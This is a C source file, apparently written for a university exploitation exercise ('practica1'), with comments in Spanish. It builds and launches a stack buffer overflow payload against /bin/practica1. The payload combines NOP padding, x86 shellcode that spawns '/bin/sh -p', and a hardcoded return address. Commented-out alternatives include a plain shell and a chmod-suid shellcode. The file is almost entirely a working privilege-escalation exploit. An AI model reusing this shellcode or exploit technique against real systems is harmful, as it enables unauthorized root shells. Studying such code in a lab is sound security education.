/*
 * 
 *  author: c0l1nr00t
*/
#include <stdio.h>    // entrada y salida estandar
#include <stdlib.h>   // funciones como malloc,calloc,exit()
#include <string.h>   // manipular bloques de string memset y memcpy
#include <unistd.h>   // funcion de ejecucion y llamadas al syscalls

void print_payload(char *payload)
{
  printf("PAYLOAD \n");
  for(int i = 0; i<strlen(payload); i++){
    printf("\n %i \\x%02x",i,(unsigned char) payload[i]);
  }
}

int main()
{
    const int INIT_PAD = 8;
    const char NOPS = 0x90;
    const int BEFORE_EIP = 44;
  /*  /bin/sh
      const unsigned char SHELL_CODE[] =
        "\x31\xc0\x50\x68\x2f\x2f\x73\x68"
        "\x68\x2f\x62\x69\x6e\x89\xe3\x50"
        "\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
  */
  // /bin/sh -p
  
  const unsigned char SHELL_CODE[] = 
       "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70"
		   "\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61"
		   "\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52"
		   "\x51\x53\x89\xe1\xcd\x80";    
  

  // Este payload deberia cambair los permisos de sh.
  // Darle permisos suid.
  //
/*
  char unsigned SHELL_CODE[]=
		"\x31\xc0\x31\xdb\x31\xc9\x53\x68\x6e"
		"\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89"
		"\xe3\x66\xb9\xfd\x09\xb0\x0f\xcd\x80"
		"\xb0\x01\xcd\x80";
  */  
    const int SIZE_SHELL_CODE = sizeof(SHELL_CODE) - 1;
    // direccion en radare2 -> ret 0xffffdfc0
    const unsigned char RET[] = "\xc0\xdf\xff\xff"; // little endian
    const int SIZE_RET = sizeof(RET) - 1;
    const int FINISH_PAD = BEFORE_EIP - INIT_PAD - SIZE_SHELL_CODE;
    const int PAYLOAD_SIZE = INIT_PAD + SIZE_SHELL_CODE + FINISH_PAD + SIZE_RET;
    char *payload = malloc(PAYLOAD_SIZE + 1);

    // Primero logramos [ [OFFSET_NOPS] ]
    memset(payload , NOPS , INIT_PAD);
    // luego llenamos  [[OFFSET_NOPS] + [SHELL_CODE]]
    memcpy(payload + INIT_PAD, SHELL_CODE , SIZE_SHELL_CODE);
    // llenamos ahora [[4*NOPS] + [SHELL_CODE] + [NOPS->44]]
    memset(payload + INIT_PAD + SIZE_SHELL_CODE, NOPS , FINISH_PAD);
    // Metiendo direccion de RET.
    memcpy(payload + INIT_PAD + SIZE_SHELL_CODE + FINISH_PAD, RET , SIZE_RET);

    payload[INIT_PAD + SIZE_SHELL_CODE + FINISH_PAD + SIZE_RET + 1] = '\0'; 
    print_payload(payload);
    printf("\nPayload size: %d bytes\n", PAYLOAD_SIZE);
    // Ejecucion
    char *argv [] = {"/bin/practica1" , payload , NULL};
    char *envp [] = {NULL};
    execve(argv[0], argv, envp);

    free(payload);
  return 0;
}
